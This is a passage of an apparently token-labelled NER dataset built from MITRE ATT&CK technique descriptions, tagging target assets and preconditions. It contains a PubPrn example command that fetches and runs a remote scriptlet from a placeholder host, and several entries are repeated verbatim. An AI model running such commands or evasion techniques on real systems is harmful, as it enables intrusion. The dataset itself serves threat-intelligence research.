operating B-TARGET_ASSET
system I-TARGET_ASSET
of O
network B-TARGET_ASSET
devices I-TARGET_ASSET
to O
read O
raw O
keystrokes B-TARGET_ASSET
for O
login O
sessions O
. O 

(Citation: O
Cisco O
Blog O
Legacy O
Device O
Attacks) O

Adversaries O
may O
attempt O
to O
hide O
their O
file-based O
artifacts O
by O
writing O
them O
to O
specific O
folders B-TARGET_ASSET
or O
file B-TARGET_ASSET
names I-TARGET_ASSET
excluded B-PRECON
from I-PRECON
antivirus I-PRECON
( I-PRECON
AV I-PRECON
) I-PRECON
scanning I-PRECON
and O
other O
defensive O
capabilities O
. O 

AV B-TARGET_ASSET
and O
other O
file-based O
scanners O
often O
include O
exclusions O
to O
optimize O
performance O
as O
well O
as O
ease O
installation O
and O
legitimate O
use O
of O
applications O
. O 

These O
exclusions O
may O
be O
contextual O
(e.g., O
scans O
are O
only O
initiated O
in O
response O
to O
specific O
triggering O
events/alerts) O
, O
but O
are O
also O
often O
hardcoded B-PRECON
strings I-PRECON
referencing O
specific O
folders B-TARGET_ASSET
and/or O
files B-TARGET_ASSET
assumed B-PRECON
to I-PRECON
be I-PRECON
trusted I-PRECON
and I-PRECON
legitimate I-PRECON
. O 

(Citation: O
Microsoft O
File O
Folder O
Exclusions) O

Adversaries O
may O
abuse O
these O
exclusions O
to O
hide O
their O
file-based O
artifacts O
. O 

For O
example O
, O
rather O
than O
tampering O
with O
tool O
settings O
to O
add O
a O
new O
exclusion O
(i.e., O
[Disable O
or O
Modify O
Tools](https://attack.mitre.org/techniques/T1562/001)) O
, O
adversaries O
may O
drop O
their O
file-based O
payloads O
in O
default B-PRECON
or O
otherwise O
well-known B-PRECON
exclusions I-PRECON
. O 

Adversaries O
may O
also O
use O
[Security O
Software O
Discovery](https://attack.mitre.org/techniques/T1518/001) O
and O
other O
[Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043) O
activities O
to O
both O
discover O
and O
verify O
existing O
exclusions O
in O
a O
victim O
environment O
. O 


Adversaries O
may O
modify O
file B-TARGET_ASSET
or O
directory B-TARGET_ASSET
permissions/attributes I-TARGET_ASSET
to O
evade O
access O
control O
lists B-TARGET_ASSET
( I-TARGET_ASSET
ACLs I-TARGET_ASSET
) I-TARGET_ASSET
and O
access O
protected O
files B-TARGET_ASSET
. O 

(Citation: O
Hybrid O
Analysis O
Icacls1 O
June O
2018)(Citation: O
Hybrid O
Analysis O
Icacls2 O
May O
2018) O
File B-TARGET_ASSET
and O
directory B-TARGET_ASSET
permissions I-TARGET_ASSET
are O
commonly O
managed O
by O
ACLs B-TARGET_ASSET
configured B-PRECON
by I-PRECON
the I-PRECON
file I-PRECON
or I-PRECON
directory I-PRECON
owner I-PRECON
, O
or O
users O
with O
the O
appropriate O
permissions O
. O 

File B-TARGET_ASSET
and O
directory B-TARGET_ASSET
ACL I-TARGET_ASSET
implementations I-TARGET_ASSET
vary O
by O
platform O
, O
but O
generally O
explicitly O
designate O
which O
users O
or O
groups O
can O
perform O
which O
actions O
(read, O
write, O
execute, O
etc.) O
. O 


Most O
Linux O
and O
Linux-based O
platforms O
provide O
a O
standard O
set O
of O
permission O
groups O
(user, O
group, O
and O
other) O
and O
a O
standard O
set O
of O
permissions O
(read, O
write, O
and O
execute) O
that O
are O
applied O
to O
each O
group O
. O 

While O
nuances O
of O
each O
platform’s O
permissions O
implementation O
may O
vary O
, O
most O
of O
the O
platforms O
provide O
two O
primary O
commands O
used O
to O
manipulate O
file B-TARGET_ASSET
and O
directory B-TARGET_ASSET
ACLs I-TARGET_ASSET
: O
<code>chown</code> O
(short O
for O
change O
owner) O
, O
and O
<code>chmod</code> O
(short O
for O
change O
mode) O
. O 


Adversarial O
may O
use O
these O
commands O
to O
make O
themselves O
the O
owner O
of O
files B-TARGET_ASSET
and O
directories B-TARGET_ASSET
or O
change O
the O
mode O
if O
current O
permissions O
allow O
it O
. O 

They O
could O
subsequently O
lock O
others O
out O
of O
the O
file B-TARGET_ASSET
. O 

Specific O
file B-TARGET_ASSET
and O
directory B-TARGET_ASSET
modifications I-TARGET_ASSET
may O
be O
a O
required O
step O
for O
many O
techniques O
, O
such O
as O
establishing O
Persistence O
via O
[Unix O
Shell O
Configuration O
Modification](https://attack.mitre.org/techniques/T1546/004) O
or O
tainting/hijacking O
other O
instrumental O
binary/configuration O
files B-TARGET_ASSET
via O
[Hijack O
Execution O
Flow](https://attack.mitre.org/techniques/T1574) O
. O 

(Citation: O
20 O
macOS O
Common O
Tools O
and O
Techniques) O

Adversaries O
with O
no B-PRECON
prior I-PRECON
knowledge I-PRECON
of I-PRECON
legitimate I-PRECON
credentials B-TARGET_ASSET
within O
the O
system O
or O
environment O
may O
guess O
passwords B-TARGET_ASSET
to O
attempt O
access O
to O
accounts B-TARGET_ASSET
. O 

Without O
knowledge O
of O
the O
password O
for O
an O
account B-TARGET_ASSET
, O
an O
adversary O
may O
opt O
to O
systematically O
guess O
the O
password B-TARGET_ASSET
using O
a O
repetitive O
or O
iterative O
mechanism O
. O 

An O
adversary O
may O
guess O
login O
credentials B-TARGET_ASSET
without O
prior O
knowledge O
of O
system O
or O
environment O
passwords O
during O
an O
operation O
by O
using O
a O
list O
of O
common O
passwords O
. O 

Password O
guessing O
may O
or O
may O
not O
take O
into O
account O
the O
target's O
policies O
on O
password O
complexity O
or O
use O
policies O
that O
may O
lock O
accounts B-TARGET_ASSET
out O
after O
a O
number O
of O
failed O
attempts O
. O 


Guessing O
passwords B-TARGET_ASSET
can O
be O
a O
risky O
option O
because O
it O
could O
cause O
numerous O
authentication O
failures O
and O
account B-TARGET_ASSET
lockouts I-TARGET_ASSET
, O
depending O
on O
the O
organization's O
login O
failure O
policies O
. O 

(Citation: O
Cylance O
Cleaver) O

Typically O
, O
management O
services B-TARGET_ASSET
over O
commonly O
used O
ports B-TARGET_ASSET
are O
used O
when O
guessing O
passwords B-TARGET_ASSET
. O 

Commonly O
targeted O
services B-TARGET_ASSET
include O
the O
following O
: O

* O
SSH B-TARGET_ASSET
(22/TCP) O
* O
Telnet B-TARGET_ASSET
(23/TCP) O
* O
FTP B-TARGET_ASSET
(21/TCP) O
* O
NetBIOS B-TARGET_ASSET
/ O
SMB B-TARGET_ASSET
/ O
Samba B-TARGET_ASSET
(139/TCP O
& O
445/TCP) O
* O
LDAP B-TARGET_ASSET
(389/TCP) O
* O
Kerberos B-TARGET_ASSET
(88/TCP) O
* O
RDP B-TARGET_ASSET
/ O
Terminal B-TARGET_ASSET
Services I-TARGET_ASSET
(3389/TCP) O
* O
HTTP/HTTP B-TARGET_ASSET
Management I-TARGET_ASSET
Services I-TARGET_ASSET
(80/TCP O
& O
443/TCP) O
* O
MSSQL B-TARGET_ASSET
(1433/TCP) O
* O
Oracle B-TARGET_ASSET
(1521/TCP) O
* O
MySQL B-TARGET_ASSET
(3306/TCP) O
* O
VNC B-TARGET_ASSET
(5900/TCP) O
* O
SNMP B-TARGET_ASSET
(161/UDP O
and O
162/TCP/UDP) O

In O
addition O
to O
management O
services B-TARGET_ASSET
, O
adversaries O
may O
""target O
single O
sign-on O
(SSO) O
and O
cloud-based O
applications B-TARGET_ASSET
utilizing O
federated O
authentication O
protocols B-TARGET_ASSET
,"" O
as O
well O
as O
externally O
facing O
email B-TARGET_ASSET
applications I-TARGET_ASSET
, O
such O
as O
Office O
365 O
. O 

(Citation: O
US-CERT O
TA18-068A O
2018) O
. O 

Further O
, O
adversaries O
may O
abuse O
network B-TARGET_ASSET
device I-TARGET_ASSET
interfaces I-TARGET_ASSET
(such O
as O
`wlanAPI`) O
to O
brute O
force O
accessible O
wifi-router(s) B-TARGET_ASSET
via O
wireless O
authentication O
protocols B-TARGET_ASSET
. O 

(Citation: O
Trend O
Micro O
Emotet O
2020) O

In O
default O
environments O
, O
LDAP B-TARGET_ASSET
and O
Kerberos B-TARGET_ASSET
connection O
attempts O
are O
less O
likely O
to O
trigger O
events O
over O
SMB B-TARGET_ASSET
, O
which O
creates O
Windows O
""logon O
failure"" O
event O
ID O
4625 O
. O 


Adversaries O
may O
use O
PubPrn B-TARGET_ASSET
to O
proxy O
execution O
of O
malicious O
remote O
files B-TARGET_ASSET
. O 

PubPrn.vbs B-TARGET_ASSET
is O
a O
[Visual B-TARGET_ASSET
Basic](https://attack.mitre.org/techniques/T1059/005) I-TARGET_ASSET
script I-TARGET_ASSET
that O
publishes O
a O
printer B-TARGET_ASSET
to O
Active B-TARGET_ASSET
Directory I-TARGET_ASSET
Domain I-TARGET_ASSET
Services I-TARGET_ASSET
. O 

The O
script B-TARGET_ASSET
may O
be O
signed B-PRECON
by I-PRECON
Microsoft I-PRECON
and O
is O
commonly O
executed O
through O
the O
[Windows B-TARGET_ASSET
Command I-TARGET_ASSET
Shell](https://attack.mitre.org/techniques/T1059/003) I-TARGET_ASSET
via O
<code>Cscript.exe</code> B-TARGET_ASSET
. O 

For O
example O
, O
the O
following O
code O
publishes O
a O
printer B-TARGET_ASSET
within O
the O
specified O
domain O
: O
<code>cscript O
pubprn O
Printer1 O
LDAP://CN=Container1,DC=Domain1,DC=Com</code> O
. O 

(Citation: O
pubprn) O

Adversaries O
may O
abuse O
PubPrn B-TARGET_ASSET
to O
execute O
malicious O
payloads B-TARGET_ASSET
hosted B-PRECON
on I-PRECON
remote I-PRECON
sites I-PRECON
. O 

(Citation: O
Enigma0x3 O
PubPrn O
Bypass) O
To O
do O
so O
, O
adversaries O
may O
set O
the O
second O
<code>script:</code> O
parameter O
to O
reference O
a O
scriptlet B-TARGET_ASSET
file I-TARGET_ASSET
( I-TARGET_ASSET
.sct I-TARGET_ASSET
) I-TARGET_ASSET
hosted B-PRECON
on I-PRECON
a I-PRECON
remote I-PRECON
site I-PRECON
. O 

An O
example O
command O
is O
<code>pubprn.vbs O
127.0.0.1 O
script:https://mydomain.com/folder/file.sct</code> O
. O 

This O
behavior O
may O
bypass O
signature O
validation O
restrictions O
and O
application B-TARGET_ASSET
control I-TARGET_ASSET
solutions I-TARGET_ASSET
that O
do O
not O
account O
for O
abuse O
of O
this O
script B-TARGET_ASSET
. O 


In O
later O
versions O
of O
Windows O
(10+) O
, O
<code>PubPrn.vbs</code> B-TARGET_ASSET
has O
been O
updated B-PRECON
to O
prevent O
proxying O
execution O
from O
a O
remote O
site O
. O 

This O
is O
done O
by O
limiting O
the O
protocol O
specified O
in O
the O
second O
parameter O
to O
<code>LDAP://</code> O
, O
vice O
the O
<code>script:</code> O
moniker O
which O
could O
be O
used O
to O
reference O
remote O
code O
via O
HTTP(S) O
. O 


Adversaries O
may O
purchase O
technical O
information O
about O
victims O
that O
can O
be O
used O
during O
targeting O
. O 

Information O
about O
victims O
may O
be O
available B-PRECON
for O
purchase O
within O
reputable O
private O
sources O
and O
databases B-TARGET_ASSET
, O
such O
as O
paid O
subscriptions O
to O
feeds O
of O
scan O
databases B-TARGET_ASSET
or O
other O
data O
aggregation O
services B-TARGET_ASSET
. O 

Adversaries O
may O
also O
purchase O
information O
from O
less-reputable O
sources O
such O
as O
dark O
web O
or O
cybercrime O
blackmarkets O
. O 


Adversaries O
may O
purchase O
information O
about O
their O
already O
identified O
targets O
, O
or O
use O
purchased O
data O
to O
discover O
opportunities O
for O
successful O
breaches O
. O 

Threat O
actors O
may O
gather O
various O
technical O
details O
from O
purchased O
data O
, O
including O
but O
not O
limited O
to O
employee O
contact O
information O
, O
credentials B-TARGET_ASSET
, O
or O
specifics O
regarding O
a O
victim’s O
infrastructure B-TARGET_ASSET
. O 

(Citation: O
ZDNET O
Selling O
Data) O
Information O
from O
these O
sources O
may O
reveal O
opportunities O
for O
other O
forms O
of O
reconnaissance O
(ex: O
[Phishing O
for O
Information](https://attack.mitre.org/techniques/T1598) O
or O
[Search O
Open O
Websites/Domains](https://attack.mitre.org/techniques/T1593)) O
, O
establishing O
operational O
resources O
(ex: O
[Develop O
Capabilities](https://attack.mitre.org/techniques/T1587) O
or O
[Obtain O
Capabilities](https://attack.mitre.org/techniques/T1588)) O
, O
and/or O
initial O
access O
(ex: O
[External O
Remote O
Services](https://attack.mitre.org/techniques/T1133) O
or O
[Valid O
Accounts](https://attack.mitre.org/techniques/T1078)) O
. O 


Adversaries O
may O
attempt O
to O
dump O
credentials B-TARGET_ASSET
to O
obtain O
account B-TARGET_ASSET
login I-TARGET_ASSET
and O
credential B-TARGET_ASSET
material I-TARGET_ASSET
, O
normally O
in O
the O
form O
of O
a O
hash O
or O
a O
clear O
text O
password O
. O 


Credentials B-TARGET_ASSET
can O
be O
obtained O
from O
OS B-TARGET_ASSET
caches I-TARGET_ASSET
, O
memory B-TARGET_ASSET
, O
or O
structures B-TARGET_ASSET
. O 

(Citation: O
Brining O
MimiKatz O
to O
Unix) O
Credentials B-TARGET_ASSET
can O
then O
be O
used O
to O
perform O
[Lateral O
Movement](https://attack.mitre.org/tactics/TA0008) O
and O
access O
restricted O
information O
. O 


Several O
of O
the O
tools O
mentioned O
in O
associated O
sub-techniques O
may O
be O
used O
by O
both O
adversaries O
and O
professional O
security O
testers O
. O 

Additional O
custom O
tools O
likely O
exist O
as O
well O
. O 


Adversaries O
may O
execute O
malicious O
payloads B-TARGET_ASSET
via O
loading O
shared B-TARGET_ASSET
modules I-TARGET_ASSET
. O 

Shared B-TARGET_ASSET
modules I-TARGET_ASSET
are O
executable O
files O
that O
are O
loaded B-PRECON
into O
processes B-TARGET_ASSET
to O
provide O
access O
to O
reusable O
code O
, O
such O
as O
specific O
custom O
functions O
or O
invoking O
OS B-TARGET_ASSET
API I-TARGET_ASSET
functions I-TARGET_ASSET
(i.e. O 

, O
[Native B-TARGET_ASSET
API](https://attack.mitre.org/techniques/T1106) I-TARGET_ASSET
) O
. O 


Adversaries O
may O
use O
this O
functionality O
as O
a O
way O
to O
execute O
arbitrary O
payloads B-TARGET_ASSET
on O
a O
victim O
system B-TARGET_ASSET
. O 

For O
example O
, O
adversaries O
can O
modularize O
functionality O
of O
their O
malware B-TARGET_ASSET
into O
shared B-TARGET_ASSET
objects I-TARGET_ASSET
that O
perform O
various O
functions O
such O
as O
managing O
C2 O
network O
communications O
or O
execution O
of O
specific O
actions O
on O
objective O
. O 


The O
Linux B-TARGET_ASSET
& O
macOS B-TARGET_ASSET
module I-TARGET_ASSET
loader I-TARGET_ASSET
can O
load O
and O
execute O
shared B-TARGET_ASSET
objects I-TARGET_ASSET
from O
arbitrary O
local O
paths O
. O 

This O
functionality O
resides O
in O
`dlfcn.h` O
in O
functions O
such O
as O
`dlopen` O
and O
`dlsym` O
. O 

Although O
macOS B-TARGET_ASSET
can O
execute O
`.so` B-TARGET_ASSET
files I-TARGET_ASSET
, O
common O
practice O
uses O
`.dylib` B-TARGET_ASSET
files I-TARGET_ASSET
. O 

(Citation: O
Apple O
Dev O
Dynamic O
Libraries)(Citation: O
Linux O
Shared O
Libraries)(Citation: O
RotaJakiro O
2021 O
netlab360 O
analysis)(Citation: O
Unit42 O
OceanLotus O
2017) O

The O
Windows B-TARGET_ASSET
module I-TARGET_ASSET
loader I-TARGET_ASSET
can O
be O
instructed O
to O
load O
DLLs B-TARGET_ASSET
from O
arbitrary O
local O
paths O
and O
arbitrary O
Universal O
Naming O
Convention O
(UNC) O
network O
paths O
. O 

This O
functionality O
resides O
in O
`NTDLL.dll` B-TARGET_ASSET
and O
is O
part O
of O
the O
Windows B-TARGET_ASSET
[Native I-TARGET_ASSET
API](https://attack.mitre.org/techniques/T1106) I-TARGET_ASSET
which O
is O
called O
from O
functions O
like O
`LoadLibrary` O
at O
run O
time O
. O 

(Citation: O
Microsoft O
DLL) O

Adversaries O
may O
collect O
data B-TARGET_ASSET
related O
to O
managed O
devices B-TARGET_ASSET
from O
configuration B-TARGET_ASSET
repositories I-TARGET_ASSET
. O 

Configuration B-TARGET_ASSET
repositories I-TARGET_ASSET
are O
used O
by O
management O
systems O
in O
order O
to O
configure O
, O
manage O
, O
and O
control O
data B-TARGET_ASSET
on O
remote O
systems B-TARGET_ASSET
. O 

Configuration B-TARGET_ASSET
repositories I-TARGET_ASSET
may O
also O
facilitate O
remote O
access O
and O
administration O
of O
devices B-TARGET_ASSET
. O 


Adversaries O
may O
target O
these O
repositories B-TARGET_ASSET
in O
order O
to O
collect O
large O
quantities O
of O
sensitive O
system O
administration O
data B-TARGET_ASSET
. O 

Data B-TARGET_ASSET
from O
configuration B-TARGET_ASSET
repositories I-TARGET_ASSET
may O
be O
exposed B-PRECON
by O
various O
protocols B-TARGET_ASSET
and O
software B-TARGET_ASSET
and O
can O
store O
a O
wide O
variety O
of O
data B-TARGET_ASSET
, O
much O
of O
which O
may O
align O
with O
adversary O
Discovery O
objectives O
. O 

(Citation: O
US-CERT-TA18-106A)(Citation: O
US-CERT O
TA17-156A O
SNMP O
Abuse O
2017) O

```
Adversaries O
may O
attempt O
to O
dump O
credentials B-TARGET_ASSET
to O
obtain O
account B-TARGET_ASSET
login I-TARGET_ASSET
and O
credential B-TARGET_ASSET
material I-TARGET_ASSET
, O
normally O
in O
the O
form O
of O
a O
hash O
or O
a O
clear O
text O
password O
. O 


Credentials B-TARGET_ASSET
can O
be O
obtained O
from O
OS B-TARGET_ASSET
caches I-TARGET_ASSET
, O
memory B-TARGET_ASSET
, O
or O
structures B-TARGET_ASSET
. O 

(Citation: O
Brining O
MimiKatz O
to O
Unix) O
Credentials B-TARGET_ASSET
can O
then O
be O
used O
to O
perform O
[Lateral O
Movement](https://attack.mitre.org/tactics/TA0008) O
and O
access O
restricted O
information O
. O 


Several O
of O
the O
tools O
mentioned O
in O
associated O
sub-techniques O
may O
be O
used O
by O
both O
adversaries O
and O
professional O
security O
testers O
. O 

Additional O
custom O
tools O
likely O
exist O
as O
well O
. O 


Adversaries O
may O
execute O
malicious O
payloads B-TARGET_ASSET
via O
loading O
shared B-TARGET_ASSET
modules I-TARGET_ASSET
. O 

Shared B-TARGET_ASSET
modules I-TARGET_ASSET
are O
executable O
files O
that O
are O
loaded B-PRECON
into O
processes B-TARGET_ASSET
to O
provide O
access O
to O
reusable O
code O
, O
such O
as O
specific O
custom O
functions O
or O
invoking O
OS B-TARGET_ASSET
API I-TARGET_ASSET
functions I-TARGET_ASSET
(i.e. O 

, O
[Native B-TARGET_ASSET
API](https://attack.mitre.org/techniques/T1106) I-TARGET_ASSET
) O
. O 


Adversaries O
may O
use O
this O
functionality O
as O
a O
way O
to O
execute O
arbitrary O
payloads B-TARGET_ASSET
on O
a O
victim O
system B-TARGET_ASSET
. O 

For O
example O
, O
adversaries O
can O
modularize O
functionality O
of O
their O
malware B-TARGET_ASSET
into O
shared B-TARGET_ASSET
objects I-TARGET_ASSET
that O
perform O
various O
functions O
such O
as O
managing O
C2 O
network O
communications O
or O
execution O
of O
specific O
actions O
on O
objective O
. O 


The O
Linux B-TARGET_ASSET
& O
macOS B-TARGET_ASSET
module I-TARGET_ASSET
loader I-TARGET_ASSET
can O
load O
and O
execute O
shared B-TARGET_ASSET
objects I-TARGET_ASSET
from O
arbitrary O
local O
paths O
. O 

This O
functionality O
resides O
in O
`dlfcn.h` O
in O
functions O
such O
as O
`dlopen` O
and O
`dlsym` O
. O 

Although O
macOS B-TARGET_ASSET
can O
execute O
`.so` B-TARGET_ASSET
files I-TARGET_ASSET
, O
common O
practice O
uses O
`.dylib` B-TARGET_ASSET
files I-TARGET_ASSET
. O 

(Citation: O
Apple O
Dev O
Dynamic O
Libraries)(Citation: O
Linux O
Shared O
Libraries)(Citation: O
RotaJakiro O
2021 O
netlab360 O
analysis)(Citation: O
Unit42 O
OceanLotus O
2017) O

The O
Windows B-TARGET_ASSET
module I-TARGET_ASSET
loader I-TARGET_ASSET
can O
be O
instructed O
to O
load O
DLLs B-TARGET_ASSET
from O
arbitrary O
local O
paths O
and O
arbitrary O
Universal O
Naming O
Convention O
(UNC) O
network O
paths O
. O 

This O
functionality O
resides O
in O
`NTDLL.dll` B-TARGET_ASSET
and O
is O
part O
of O
the O
Windows B-TARGET_ASSET
[Native I-TARGET_ASSET
API](https://attack.mitre.org/techniques/T1106) I-TARGET_ASSET
which O
is O
called O
from O
functions O
like O
`LoadLibrary` O
at O
run O
time O
. O 

(Citation: O
Microsoft O
DLL) O

Adversaries O
may O
collect O
data B-TARGET_ASSET
related O
to O
managed O
devices B-TARGET_ASSET
from O
configuration B-TARGET_ASSET
repositories I-TARGET_ASSET
. O 

Configuration B-TARGET_ASSET
repositories I-TARGET_ASSET
are O
used O
by O
management O
systems O
in O
order O
to O
configure O
, O
manage O
, O
and O
control O
data B-TARGET_ASSET
on O
remote O
systems B-TARGET_ASSET
. O 

Configuration B-TARGET_ASSET
repositories I-TARGET_ASSET
may O
also O
facilitate O
remote O
access O
and O
administration O
of O
devices B-TARGET_ASSET
. O 


Adversaries O
may O
target O
these O
repositories B-TARGET_ASSET
in O
order O
to O
collect O
large O
quantities O
of O
sensitive O
system O
administration O
data B-TARGET_ASSET
. O 

Data B-TARGET_ASSET
from O
configuration B-TARGET_ASSET
repositories I-TARGET_ASSET
may O
be O
exposed B-PRECON
by O
various O
protocols B-TARGET_ASSET
and O
software B-TARGET_ASSET
and O
can O
store O
a O
wide O
variety O
of O
data B-TARGET_ASSET
, O
much O
of O
which O
may O
align O
with O
adversary O
Discovery O
objectives O
. O 

(Citation: O
US-CERT-TA18-106A)(Citation: O
US-CERT O
TA17-156A O
SNMP O
Abuse O
2017) O

Adversaries O
may O
corrupt O
or O
wipe O
the O
disk B-TARGET_ASSET
data I-TARGET_ASSET
structures I-TARGET_ASSET
on O
a O
hard B-TARGET_ASSET
drive I-TARGET_ASSET
necessary O
to O
boot O
a O
system B-TARGET_ASSET
; O
targeting O
specific O
critical O
systems B-TARGET_ASSET
or O
in O
large O
numbers O
in O
a O
network B-TARGET_ASSET
to O
interrupt O
availability O
to O
system B-TARGET_ASSET
and O
network B-TARGET_ASSET
resources I-TARGET_ASSET
. O 


Adversaries O
may O
attempt O
to O
render O
the O
system B-TARGET_ASSET
unable B-PRECON
to I-PRECON
boot I-PRECON
by O
overwriting O
critical O
data B-TARGET_ASSET
located O
in O
structures B-TARGET_ASSET
such O
as O
the O
master B-TARGET_ASSET
boot I-TARGET_ASSET
record I-TARGET_ASSET
( I-TARGET_ASSET
MBR I-TARGET_ASSET
) I-TARGET_ASSET
or O
partition B-TARGET_ASSET
table I-TARGET_ASSET
. O 

(Citation: O
Symantec O
Shamoon O
2012)(Citation: O
FireEye O
Shamoon O
Nov O
2016)(Citation: O
Palo O
Alto O
Shamoon O
Nov O
2016)(Citation: O
Kaspersky O
StoneDrill O
2017)(Citation: O
Unit O
42 O
Shamoon3 O
2018) O
The O
data B-TARGET_ASSET
contained O
in O
disk B-TARGET_ASSET
structures I-TARGET_ASSET
may O
include O
the O
initial O
executable O
code O
for O
loading O
an O
operating B-TARGET_ASSET
system I-TARGET_ASSET
or O
the O
location O
of O
the O
file B-TARGET_ASSET
system I-TARGET_ASSET
partitions I-TARGET_ASSET
on O
disk B-TARGET_ASSET
. O 

If O
this O
information O
is O
not O
present O
, O
the O
computer B-TARGET_ASSET
will O
not O
be O
able O
to O
load O
an O
operating B-TARGET_ASSET
system I-TARGET_ASSET
during O
the O
boot O
process O
, O
leaving O
the O
computer B-TARGET_ASSET
unavailable B-PRECON
. O 


[Disk B-TARGET_ASSET
Structure I-TARGET_ASSET
Wipe I-TARGET_ASSET
](https://attack.mitre.org/techniques/T1561/002) O
may O
be O
performed O
in O
isolation O
, O
or O
along O
with O
[Disk B-TARGET_ASSET
Content I-TARGET_ASSET
Wipe I-TARGET_ASSET
](https://attack.mitre.org/techniques/T1561/001) O
if O
all O
sectors O
of O
a O
disk B-TARGET_ASSET
are O
wiped O
. O 


On O
a O
network B-TARGET_ASSET
devices I-TARGET_ASSET
, O
adversaries O
may O
reformat O
the O
file B-TARGET_ASSET
system I-TARGET_ASSET
using O
[Network B-TARGET_ASSET
Device I-TARGET_ASSET
CLI](https://attack.mitre.org/techniques/T1059/008) I-TARGET_ASSET
commands O
such O
as O
`format` O
. O 

(Citation: O
format_cmd_cisco) O

To O
maximize O
impact O
on O
the O
target O
organization O
, O
malware B-TARGET_ASSET
designed O
for O
destroying O
disk B-TARGET_ASSET
structures I-TARGET_ASSET
may O
have O
worm-like O
features O
to O
propagate O
across O
a O
network B-TARGET_ASSET
by O
leveraging O
other O
techniques O
like O
[Valid O
Accounts](https://attack.mitre.org/techniques/T1078) O
, O
[OS O
Credential O
Dumping](https://attack.mitre.org/techniques/T1003) O
, O
and O
[SMB/Windows O
Admin O
Shares](https://attack.mitre.org/techniques/T1021/002) O
. O 

(Citation: O
Symantec O
Shamoon O
2012)(Citation: O
FireEye O
Shamoon O
Nov O
2016)(Citation: O
Palo O
Alto O
Shamoon O
Nov O
2016)(Citation: O
Kaspersky O
StoneDrill O
2017) O

Adversaries O
may O
attempt O
to O
cause O
a O
denial O
of O
service O
(DoS) O
by O
directly O
sending O
a O
high-volume O
of O
network O
traffic B-TARGET_ASSET
to O
a O
target O
. O 

This O
DoS O
attack O
may O
also O
reduce O
the O
availability O
and O
functionality O
of O
the O
targeted O
system(s) B-TARGET_ASSET
and O
network B-TARGET_ASSET
. O 


[Direct B-TARGET_ASSET
Network I-TARGET_ASSET
Flood](https://attack.mitre.org/techniques/T1498/001) I-TARGET_ASSET
s O
are O
when O
one O
or O
more O
systems B-TARGET_ASSET
are O
used O
to O
send O
a O
high-volume O
of O
network B-TARGET_ASSET
packets I-TARGET_ASSET
towards O
the O
targeted O
service's B-TARGET_ASSET
network I-TARGET_ASSET
. O 


Almost O
any O
network B-TARGET_ASSET
protocol I-TARGET_ASSET
may O
be O
used O
for O
flooding O
. O 

Stateless O
protocols B-TARGET_ASSET
such O
as O
UDP B-TARGET_ASSET
or O
ICMP B-TARGET_ASSET
are O
commonly O
used O
but O
stateful O
protocols B-TARGET_ASSET
such O
as O
TCP B-TARGET_ASSET
can O
be O
used O
as O
well O
. O 


Botnets B-TARGET_ASSET
are O
commonly O
used O
to O
conduct O
network B-TARGET_ASSET
flooding I-TARGET_ASSET
attacks I-TARGET_ASSET
against O
networks B-TARGET_ASSET
and O
services B-TARGET_ASSET
. O 


Large O
botnets B-TARGET_ASSET
can O
generate O
a O
significant O
amount O
of O
traffic O
from O
systems B-TARGET_ASSET
spread B-PRECON
across I-PRECON
the I-PRECON
global I-PRECON
Internet I-PRECON
. O 


Adversaries O
may O
have O
the O
resources O
to O
build O
out O
and O
control O
their O
own O
botnet B-TARGET_ASSET
infrastructure I-TARGET_ASSET
or O
may O
rent O
time O
on O
an O
existing O
botnet B-TARGET_ASSET
to O
conduct O
an O
attack O
. O 


In O
some O
of O
the O
worst O
cases O
for O
distributed O
DoS O
(DDoS) O
, O
so O
many O
systems B-TARGET_ASSET
are O
used O
to O
generate O
the O
flood O
that O
each O
one O
only O
needs O
to O
send O
out O
a O
small O
amount O
of O
traffic O
to O
produce O
enough O
volume O
to O
saturate O
the O
target O
network B-TARGET_ASSET
. O 


In O
such O
circumstances O
, O
distinguishing O
DDoS O
traffic O
from O
legitimate O
clients O
becomes O
exceedingly O
difficult O
. O 


Botnets B-TARGET_ASSET
have O
been O
used O
in O
some O
of O
the O
most O
high-profile O
DDoS O
flooding O
attacks O
, O
such O
as O
the O
2012 O
series O
of O
incidents O
that O
targeted O
major O
US O
banks O
. O 

(Citation: O
USNYAG O
IranianBotnet O
March O
2016) O

Adversaries O
may O
insert O
, O
delete O
, O
or O
manipulate O
data B-TARGET_ASSET
at B-PRECON
rest I-PRECON
in O
order O
to O
manipulate O
external O
outcomes O
or O
hide O
activity O
. O 

(Citation: O
FireEye O
APT38 O
Oct O
2018)(Citation: O
DOJ O
Lazarus O
Sony O
2018) O
By O
manipulating O
stored O
data B-TARGET_ASSET
, O
adversaries O
may O
attempt O
to O
affect O
a O
business O
process O
, O
organizational O
understanding O
, O
and O
decision O
making O
. O 


Stored O
data B-TARGET_ASSET
could O
include O
a O
variety O
of O
file B-TARGET_ASSET
formats I-TARGET_ASSET
, O
such O
as O
Office O
files B-TARGET_ASSET
, O
databases B-TARGET_ASSET
, O
stored O
emails B-TARGET_ASSET
, O
and O
custom O
file B-TARGET_ASSET
formats I-TARGET_ASSET
. O 


The O
type O
of O
modification O
and O
the O
impact O
it O
will O
have O
depends O
on O
the O
type O
of O
data O
as O
well O
as O
the O
goals O
and O
objectives O
of O
the O
adversary O
. O 


For O
complex O
systems O
, O
an O
adversary O
would O
likely O
need O
special O
expertise O
and O
possibly O
access O
to O
specialized O
software O
related O
to O
the O
system O
that O
would O
typically O
be O
gained O
through O
a O
prolonged O
information O
gathering O
campaign O
in O
order O
to O
have O
the O
desired O
impact O
. O 


Adversaries O
may O
execute O
their O
own O
malicious O
payloads B-TARGET_ASSET
by O
hijacking O
environment B-TARGET_ASSET
variables I-TARGET_ASSET
used O
to O
load O
libraries B-TARGET_ASSET
. O 


The O
PATH B-TARGET_ASSET
environment I-TARGET_ASSET
variable I-TARGET_ASSET
contains O
a O
list O
of O
directories O
(User O
and O
System) O
that O
the O
OS B-TARGET_ASSET
searches O
sequentially O
through O
in O
search O
of O
the O
binary B-TARGET_ASSET
that O
was O
called O
from O
a O
script O
or O
the O
command O
line O
. O 


Adversaries O
can O
place O
a O
malicious O
program B-TARGET_ASSET
in O
an O
earlier O
entry O
in O
the O
list O
of O
directories O
stored O
in O
the O
PATH B-TARGET_ASSET
environment I-TARGET_ASSET
variable I-TARGET_ASSET
, O
resulting O
in O
the O
operating B-TARGET_ASSET
system I-TARGET_ASSET
executing O
the O
malicious O
binary B-TARGET_ASSET
rather O
than O
the O
legitimate O
binary B-TARGET_ASSET
when O
it O
searches O
sequentially O
through O
that O
PATH O
listing O
. O 


